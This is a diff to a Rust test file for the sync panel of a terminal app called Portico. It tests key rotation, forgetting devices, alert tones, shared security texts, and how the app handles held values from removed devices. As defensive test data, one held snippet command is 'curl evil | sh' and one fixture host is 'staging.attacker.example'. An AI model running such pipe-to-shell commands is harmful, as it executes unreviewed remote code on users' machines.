@@ -12,7 +12,7 @@ use portico_core::sync::api::{
     ForgetPreview, NewerEpochFile, RevokedValueItem, RotationOutcome, RotationPeer,
     RotationPreview, SyncKeyEntry,
 };
-use portico_core::sync::{NewPassphrase, WaitReason};
+use portico_core::sync::{NewPassphrase, SyncValue, WaitReason};
 
 use super::*;
 use crate::sync_panel::PassField;
@@ -116,8 +116,8 @@ fn held() -> Vec<RevokedValueItem> {
             alias: "staging".into(),
         },
         device: Some("old-mac (0b5e7d21)".into()),
-        local: None,
-        synced: None,
+        local: Some(SyncValue::Host(host_value("staging.attacker.example"))),
+        synced: Some(SyncValue::Host(host_value("staging.internal"))),
         hash: "h1".into(),
     }]
 }
@@ -159,9 +159,15 @@ fn rotate_about(app: &mut App) {
     app.update(Action::SyncRotationPreview(Ok(preview(true))));
 }
 
+/// `↵` on the first step once it was read to the end (the view marks it).
+fn past_about(app: &mut App) {
+    let _ = text(app, 120, 48);
+    app.update(Action::SyncKey(key(KeyCode::Enter)));
+}
+
 fn rotate_new(app: &mut App) {
     rotate_about(app);
-    app.update(Action::SyncKey(key(KeyCode::Enter)));
+    past_about(app);
     press(app, "old words");
     app.update(Action::SyncKey(key(KeyCode::Enter)));
 }
@@ -222,7 +228,7 @@ fn status_words_for_the_new_states() {
                 reason: WaitReason::RotationPending,
                 device: None,
             },
-            "Finishing key rotation…",
+            "Finishing the key rotation…",
         ),
         (
             SyncStatus::Waiting {
@@ -236,6 +242,96 @@ fn status_words_for_the_new_states() {
         let (label, _) = crate::sync_panel::status_label(&status, now);
         assert_eq!(label, words);
     }
+}
+
+/// B5: one tone mapping in both UIs (`docs/SYNC.md` §13.12).
+#[test]
+fn tones_of_the_key_states() {
+    use crate::sync_panel::Tone;
+    let now = time::OffsetDateTime::now_utc();
+    let cases = [
+        (alert(AlertKind::KeysRotatedElsewhere, None), Tone::Warning),
+        (alert(AlertKind::RotationConflict, None), Tone::Error),
+        (alert(AlertKind::DeviceForgotten, None), Tone::Error),
+        (alert(AlertKind::RevokedWrites, None), Tone::Error),
+        (
+            SyncStatus::Waiting {
+                reason: WaitReason::RotationPending,
+                device: None,
+            },
+            Tone::Busy,
+        ),
+        (
+            SyncStatus::Waiting {
+                reason: WaitReason::NeedsNewKeys,
+                device: Some("desk (77a1b2c3)".into()),
+            },
+            Tone::Warning,
+        ),
+    ];
+    for (status, tone) in cases {
+        assert_eq!(
+            crate::sync_panel::status_label(&status, now).1,
+            tone,
+            "{status:?}"
+        );
+    }
+}
+
+/// B8: the security texts both UIs show, word for word (the GUI's
+/// `syncview.ts` holds the same strings, tested on its side).
+#[test]
+fn shared_security_texts_word_for_word() {
+    use crate::ui::sync::rotate::{
+        CLOUD_TEXT, KEEP_MINE_TEXT, cloud_reminder, cloud_title, device_to_update, forgotten_result,
+    };
+    assert_eq!(
+        crate::ui::sync::LEAVE_NOTE,
+        "Leaves the list without changing the keys: unless its key is forgotten too, this device can still read the current sync until the next rotation. To really exclude a device, forget it from another device."
+    );
+    assert_eq!(
+        forgotten_result(&["old-mac (0b5e7d21)".into()]),
+        "Forgotten: old-mac (0b5e7d21). It cannot read what is synced from now on."
+    );
+    assert_eq!(
+        cloud_reminder(&["old-mac (0b5e7d21)".into()]),
+        "Also remove old-mac (0b5e7d21)'s access to your cloud folder, if not done yet: only that closes the remaining window."
+    );
+    assert_eq!(
+        cloud_title("x"),
+        "Also remove x's access to your cloud folder"
+    );
+    assert!(CLOUD_TEXT.starts_with("Its Dropbox, iCloud or OneDrive session"));
+    assert!(KEEP_MINE_TEXT.contains("The other rotation's removals are lost"));
+    assert_eq!(
+        crate::sync_panel::OLD_KEY_CONSEQUENCE,
+        "Files sealed only with it can no longer be read here."
+    );
+    assert_eq!(
+        device_to_update("workstation (a07d51c2)", &["workstation (a07d51c2)".into()]),
+        "workstation (a07d51c2) — update Portico first"
+    );
+    assert_eq!(
+        crate::sync_panel::REUSED_ROTATION,
+        "Portico accepted this passphrase before. Choose a new one, or generate one."
+    );
+    assert_eq!(
+        crate::sync_panel::new_keys_title(Some("desk (77a1b2c3)")),
+        "desk (77a1b2c3) reports new keys"
+    );
+    let mut app = synced_app();
+    rotate_about(&mut app);
+    let all = text(&mut app, 120, 36);
+    // Wrapped on screen: the sentence's words, in order, across the rows.
+    let words: Vec<&str> = all
+        .split(|c: char| c.is_whitespace() || c == '│')
+        .filter(|w| !w.is_empty())
+        .collect();
+    let flat = words.join(" ");
+    assert!(
+        flat.contains("What was synced before stays readable to whoever had the old keys."),
+        "{all}"
+    );
 }
 
 #[test]
@@ -308,7 +404,7 @@ fn forget_starts_with_the_cloud_folder_and_names_what_it_wrote() {
     let all = text(&mut app, 80, 24);
     assert!(all.contains("Keys rotated."), "{all}");
     assert!(
-        all.contains("Removed from sync: old-mac (0b5e7d21)."),
+        all.contains("Forgotten: old-mac (0b5e7d21). It cannot read what is synced from now on."),
         "{all}"
     );
     assert!(all.contains("Enter the new passphrase on:"), "{all}");
@@ -350,7 +446,10 @@ fn old_keys_are_listed_and_removed_after_y() {
     open_s2(&mut app, SyncTab::Devices);
     let all = text(&mut app, 80, 24);
     assert!(all.contains("Old keys in this keychain"), "{all}");
-    assert!(all.contains("Keys 2 · this sync"), "{all}");
+    assert!(
+        all.contains("Old keys (rotation 2) · this sync · not in use"),
+        "{all}"
+    );
     press(&mut app, "jjj");
     press(&mut app, "x");
     assert!(matches!(
@@ -365,7 +464,7 @@ fn old_keys_are_listed_and_removed_after_y() {
     }
     let all = text(&mut app, 80, 24);
     assert!(
-        all.contains("Remove Keys 2 · this sync from this keychain?"),
+        all.contains("Remove these old keys from this keychain?"),
         "{all}"
     );
     press(&mut app, "y");
@@ -475,7 +574,7 @@ fn rotation_conflict_offers_two_explicit_choices() {
     app.update(Action::SyncRotationPreview(Ok(preview(false))));
     let all = text(&mut app, 80, 24);
     assert!(all.contains("removals are lost"), "{all}");
-    app.update(Action::SyncKey(key(KeyCode::Enter)));
+    past_about(&mut app);
     assert_eq!(rotate_flow(&app).step, RotateStep::New);
     app.update(Action::SyncKey(key(KeyCode::Esc)));
     app.update(Action::SyncKey(key(KeyCode::Esc)));
@@ -572,8 +671,11 @@ fn held_values_are_decided_one_by_one_nothing_preselected() {
     app.sync_panel.as_mut().unwrap().received = last;
     app.sync_panel.as_mut().unwrap().selected_at = armed();
     let all = text(&mut app, 120, 36);
-    assert!(all.contains("From forgotten devices"), "{all}");
-    assert!(all.contains("held · from old-mac (0b5e7d21)"), "{all}");
+    assert!(all.contains("From removed devices"), "{all}");
+    assert!(
+        all.contains("held · from removed old-mac (0b5e7d21)"),
+        "{all}"
+    );
     // `y` is not a choice here.
     press(&mut app, "y");
     assert!(app.sync_panel.as_ref().unwrap().busy.is_none());
@@ -608,6 +710,207 @@ fn a_rejoin_offers_only_review_each() {
     assert!(all.contains("synced with this folder before"), "{all}");
 }
 
+/// B1: at 80×24 the host screen keeps a key alert in the status bar
+/// (its parts drop one by one, never the item) and the banner says it
+/// first, in its tone, above what was received.
+#[test]
+fn key_alerts_stay_visible_on_the_host_screen_at_80x24() {
+    for (status, words) in [
+        (
+            alert(AlertKind::KeysRotatedElsewhere, Some("desk (77a1b2c3)")),
+            "Keys changed",
+        ),
+        (alert(AlertKind::RotationConflict, None), "Key conflict"),
+        (
+            SyncStatus::Waiting {
+                reason: WaitReason::NeedsNewKeys,
+                device: Some("desk (77a1b2c3)".into()),
+            },
+            "New keys needed",
+        ),
+    ] {
+        let mut app = synced_app();
+        with_status(&mut app, status, true);
+        let lines = screen(&mut app, 80, 24);
+        let bar = lines.last().unwrap();
+        assert!(bar.contains(&format!("▲ ⇅ {words}")), "{bar}");
+        assert!(bar.contains("quit"), "quit is kept: {bar}");
+        let all = lines.join("\n");
+        let alert_row = all.find(&format!("▲ {words}")).expect(&all);
+        let received_row = all.find("wait for your confirmation").expect(&all);
+        assert!(alert_row < received_row, "the alert first: {all}");
+    }
+    // Nothing received: the banner still says it.
+    let mut app = synced_app();
+    app.sync.pending.clear();
+    app.sync.snippets.clear();
+    with_status(&mut app, alert(AlertKind::DeviceForgotten, None), true);
+    let all = text(&mut app, 80, 24);
+    assert!(all.contains("▲ Removed from sync"), "{all}");
+    // A quiet state keeps its full label and counts.
+    let mut app = synced_app();
+    let bar = screen(&mut app, 80, 24).last().unwrap().clone();
+    assert!(bar.contains("3 to review"), "{bar}");
+}
+
+fn held_value(hash: &str, command: &str) -> RevokedValueItem {
+    RevokedValueItem {
+        key: "snippet:deploy".into(),
+        subject: SyncSubject::Snippet {
+            id: "deploy".into(),
+        },
+        device: Some("old-mac (0b5e7d21)".into()),
+        local: Some(SyncValue::Snippet(portico_core::sync::SyncSnippetValue {
+            name: "Deploy".into(),
+            command: command.into(),
+            description: None,
+            run: true,
+        })),
+        synced: None,
+        hash: hash.into(),
+    }
+}
+
+/// A3: a held value shows what each key decides (the value held here, the
+/// one the other devices hold), its decision names the hash shown, and a
+/// list that changed under the cursor waits [`ARM_DELAY`] again.
+#[test]
+fn held_decision_waits_after_list_change() {
+    let mut app = synced_app();
+    app.sync.pending.clear();
+    app.sync.snippets.clear();
+    app.sync
+        .set_held(vec![held_value("h1", "./deploy.sh")], armed());
+    app.sync.changed_at = Some(armed());
+    open_s2(&mut app, SyncTab::Received);
+    app.sync_panel.as_mut().unwrap().selected_at = armed();
+    let all = text(&mut app, 80, 24);
+    assert!(
+        all.contains("./deploy.sh"),
+        "the held value is shown: {all}"
+    );
+    assert!(all.contains("On the other devices"), "{all}");
+    assert!(
+        all.contains("None: t removes it from this device."),
+        "{all}"
+    );
+    // The value changes on this device: a new hash, the list re-armed.
+    app.update(Action::SyncHeld(Ok(vec![held_value(
+        "h2",
+        "curl evil | sh",
+    )])));
+    let _ = text(&mut app, 80, 24);
+    press(&mut app, "m");
+    assert!(
+        app.sync_panel.as_ref().unwrap().busy.is_none(),
+        "not armed after the change"
+    );
+    app.sync.changed_at = Some(armed());
+    let all = text(&mut app, 80, 24);
+    assert!(all.contains("curl evil | sh"), "{all}");
+    let panel = app.sync_panel.as_mut().unwrap();
+    let outcome = panel.handle_key(ch('m'), &app.sync, Instant::now());
+    let SyncOutcome::Held { hash, choice, .. } = outcome else {
+        panic!("{outcome:?}");
+    };
+    assert_eq!(hash, "h2", "the hash of what is on screen");
+    assert_eq!(
+        choice,
+        portico_core::sync::api::RevokedValueChoice::KeepAsMine
+    );
+}
+
+/// B3: a reused passphrase gets the hint of the dialog, by code.
+#[test]
+fn a_reused_passphrase_gets_the_dialogs_own_hint() {
+    let mut app = synced_app();
+    with_status(&mut app, alert(AlertKind::KeysRotatedElsewhere, None), true);
+    open_s2(&mut app, SyncTab::Overview);
+    app.update(Action::SyncKey(key(KeyCode::Enter)));
+    app.update(Action::SyncAdopted {
+        previous_failed: false,
+        result: Err(portico_core::ErrorSummary {
+            code: "sync_passphrase_reused".into(),
+            message: "this sync passphrase opens older sync keys".into(),
+            hint: Some("a generic hint".into()),
+        }),
+    });
+    let form = app.sync_panel.as_ref().unwrap().form().unwrap();
+    assert_eq!(
+        form.problem.as_ref().and_then(|(_, _, h)| h.as_deref()),
+        Some(crate::sync_panel::REUSED_ADOPTION)
+    );
+    // Cleared once something is typed.
+    press(&mut app, "x");
+    assert!(
+        app.sync_panel
+            .as_ref()
+            .unwrap()
+            .form()
+            .unwrap()
+            .problem
+            .is_none()
+    );
+}
+
+/// B10: "Changes from a removed device" has a primary: ↵ opens the held
+/// values; the hint names the device to update.
+#[test]
+fn revoked_writes_review_held_values_first() {
+    let mut app = synced_app();
+    with_status(
+        &mut app,
+        alert(AlertKind::RevokedWrites, Some("workstation (a07d51c2)")),
+        true,
+    );
+    app.sync.set_held(held(), armed());
+    open_s2(&mut app, SyncTab::Overview);
+    let all = text(&mut app, 120, 36);
+    assert!(all.contains("review held values"), "{all}");
+    assert!(
+        all.contains("Enter the new passphrase on workstation (a07d51c2)."),
+        "{all}"
+    );
+    app.update(Action::SyncKey(key(KeyCode::Enter)));
+    let panel = app.sync_panel.as_ref().unwrap();
+    assert_eq!(panel.tab, SyncTab::Received);
+    assert!(matches!(
+        panel.selected_received(&app.sync),
+        Some(crate::sync_panel::ReceivedItem::Held(_))
+    ));
+}
+
+/// A4 through the app: a timeout leaves the dialog checking; the
+/// overview read again with a new epoch shows the result.
+#[test]
+fn rotation_timeout_does_not_ask_for_another_passphrase() {
+    let mut app = synced_app();
+    rotate_new(&mut app);
+    if let PanelMode::Rotate(flow) = &mut app.sync_panel.as_mut().unwrap().mode {
+        flow.step = RotateStep::Working;
+        flow.epoch_before = Some(1);
+    }
+    app.update(Action::SyncRotated(Err(portico_core::ErrorSummary {
+        code: "sync_folder_timeout".into(),
+        message: "the sync folder did not answer in time".into(),
+        hint: None,
+    })));
+    assert_eq!(rotate_flow(&app).step, RotateStep::Checking);
+    let all = text(&mut app, 80, 24);
+    assert!(
+        all.contains("Result unknown — Portico is checking"),
+        "{all}"
+    );
+    assert!(!all.contains("Choose the new passphrase"), "{all}");
+    app.update(Action::SyncOverview(Ok(SyncOverview {
+        epoch: Some(2),
+        ..idle(0)
+    })));
+    assert_eq!(rotate_flow(&app).step, RotateStep::Done);
+    let all = text(&mut app, 80, 24);
+    assert!(all.contains("Keys rotated."), "{all}");
+}
+
 #[test]
 fn every_new_screen_fits_80x24_and_120x36() {
     for (_, setup) in screens() {
@@ -629,11 +932,11 @@ fn screens() -> Vec<(&'static str, Setup)> {
         ("rotate-about", rotate_about),
         ("rotate-authorize", |a| {
             rotate_about(a);
-            a.update(Action::SyncKey(key(KeyCode::Enter)));
+            past_about(a);
         }),
         ("rotate-dont-know", |a| {
             rotate_about(a);
-            a.update(Action::SyncKey(key(KeyCode::Enter)));
+            past_about(a);
             a.update(Action::SyncKey(key(KeyCode::Tab)));
             press(a, " ");
         }),
@@ -654,7 +957,7 @@ fn screens() -> Vec<(&'static str, Setup)> {
         }),
         ("rotate-confirm", |a| {
             rotate_about(a);
-            a.update(Action::SyncKey(key(KeyCode::Enter)));
+            past_about(a);
             a.update(Action::SyncKey(key(KeyCode::Tab)));
             press(a, " ");
             a.update(Action::SyncKey(key(KeyCode::Enter)));
@@ -671,7 +974,7 @@ fn screens() -> Vec<(&'static str, Setup)> {
         }),
         ("forget-confirm", |a| {
             forget_about(a);
-            a.update(Action::SyncKey(key(KeyCode::Enter)));
+            past_about(a);
             press(a, "old words");
             a.update(Action::SyncKey(key(KeyCode::Enter)));
             a.update(Action::SyncGenerated(
@@ -703,6 +1006,46 @@ fn screens() -> Vec<(&'static str, Setup)> {
             }
         }),
         ("rotate-done", |a| rotate_done(a, false)),
+        ("rotate-checking", |a| {
+            rotate_new(a);
+            if let PanelMode::Rotate(flow) = &mut a.sync_panel.as_mut().unwrap().mode {
+                flow.step = RotateStep::Working;
+                flow.epoch_before = Some(1);
+            }
+            a.update(Action::SyncRotated(Err(portico_core::ErrorSummary {
+                code: "sync_folder_timeout".into(),
+                message: "the sync folder did not answer in time".into(),
+                hint: None,
+            })));
+        }),
+        ("forget-about-end", |a| {
+            forget_about(a);
+            let _ = text(a, 80, 24);
+            a.update(Action::SyncKey(key(KeyCode::Enter)));
+        }),
+        ("adopt-newer", |a| {
+            with_status(
+                a,
+                alert(AlertKind::KeysRotatedElsewhere, Some("desk (77a1b2c3)")),
+                true,
+            );
+            open_s2(a, SyncTab::Overview);
+            a.update(Action::SyncNewerFiles(Ok(newer())));
+            a.update(Action::SyncKey(key(KeyCode::Enter)));
+        }),
+        ("hosts-needs-new-keys", |a| {
+            with_status(
+                a,
+                SyncStatus::Waiting {
+                    reason: WaitReason::NeedsNewKeys,
+                    device: Some("desk (77a1b2c3)".into()),
+                },
+                true,
+            );
+        }),
+        ("hosts-conflict", |a| {
+            with_status(a, alert(AlertKind::RotationConflict, None), true);
+        }),
         ("rotate-pending", |a| rotate_done(a, true)),
         ("forget-about", forget_about),
         ("devices-keys", |a| {
@@ -1047,7 +1390,11 @@ async fn lost_device_drill_through_the_panel() {
     .await;
     let all = text(&mut app, 120, 36);
     assert!(all.contains("Also remove lost ("), "{all}");
-    app.update(Action::SyncKey(key(KeyCode::Enter)));
+    // ↵ reads to the end first, then goes on (B9).
+    while rotate_flow(&app).step == RotateStep::About {
+        let _ = text(&mut app, 120, 36);
+        app.update(Action::SyncKey(key(KeyCode::Enter)));
+    }
     app.update(Action::Paste(p.clone()));
     app.update(Action::SyncKey(key(KeyCode::Enter)));
     let next = generate_passphrase().unwrap();
